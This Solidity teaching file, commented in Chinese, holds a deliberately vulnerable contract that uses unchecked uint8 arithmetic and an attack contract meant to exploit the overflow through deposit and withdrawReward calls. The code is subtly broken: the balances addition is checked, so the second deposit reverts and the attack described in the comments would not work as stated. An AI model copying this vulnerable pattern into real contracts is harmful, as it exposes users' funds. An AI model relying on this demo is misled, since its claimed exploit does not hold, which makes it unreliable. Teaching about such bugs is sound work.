// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.8.0;

// 漏洞示範合約：Arithmetic overflow 的漏洞使用 uint8 並利用 unchecked 區塊

contract ArithmeticIssuesVulnerable {
    // 漏洞重點：totalDeposits 使用 unchecked 加法，容易因 overflow 而錯誤計算
    uint8 public totalDeposits; // 當累加值超過 255 時，會發生 wrap-around overflow
    mapping(address => uint8) public balances;
    uint8 public constant multiplier = 2;

    // deposit 函式，未檢查 overflow
    function deposit(uint8 amount) external payable {
        unchecked {
            // 漏洞處：當 totalDeposits + amount 超過 uint8 上限 255 時會發生 overflow
            totalDeposits += amount;
        }
        balances[msg.sender] += amount;
    }

    // withdrawReward 函式，基於錯誤累計的 totalDeposits 計算 reward，可能導致不正確分配
    function withdrawReward() external {
        uint8 userBalance = balances[msg.sender];
        uint8 reward;
        unchecked {
            // 漏洞處：計算可能因 overflow 而產生錯誤值
            reward = userBalance * multiplier + (totalDeposits - userBalance);
        }
        // 示範用途：將 reward 數量的 wei 轉給 msg.sender
        payable(msg.sender).transfer(reward);
        balances[msg.sender] = 0;
    }

    // 正確接收 Ether 的 receive 函式
    receive() external payable {}
}

// 攻擊合約：利用 arithmetic overflow 漏洞進行攻擊
// 攻擊流程說明：
// 1. 先以 deposit(250) 呼叫，使 totalDeposits 接近 uint8 上限 255
// 2. 再以 deposit(10) 呼叫，因 250 + 10 = 260 超過上限，產生溢位 (260 mod 256 = 4)
// 3. 呼叫 withdrawReward() 後, 錯誤的數學計算可能使攻擊者取得不合理的 reward

contract AttackContract {
    // 由於 ArithmeticIssuesVulnerable 合約含有 payable fallback function，
    // 構造函式引數必須定義為 address payable，以確保顯式類型轉換正確。
    ArithmeticIssuesVulnerable public vulnerable;

    constructor(address payable _vulnerable) {
        vulnerable = ArithmeticIssuesVulnerable(_vulnerable);
    }

    // executeAttack 為最小可行的攻擊範例
    function executeAttack() public payable {
        // 呼叫 deposit(250)，設定 totalDeposits 為 250
        vulnerable.deposit(250);
        // 呼叫 deposit(10)，觸發 overflow：250 + 10 = 260，實際 totalDeposits 變為 4 (260 mod 256)
        vulnerable.deposit(10);
        // 呼叫 withdrawReward()，基於錯誤計算的 totalDeposits 發送錯誤的 reward
        vulnerable.withdrawReward();
    }

    // 接收從 Vulnerable 合約發出的 Ether
    receive() external payable {}
}
